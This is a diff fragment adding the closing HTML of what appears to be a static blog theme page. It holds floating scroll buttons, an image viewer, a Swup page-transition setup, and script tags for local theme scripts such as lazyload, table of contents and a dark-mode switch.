+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
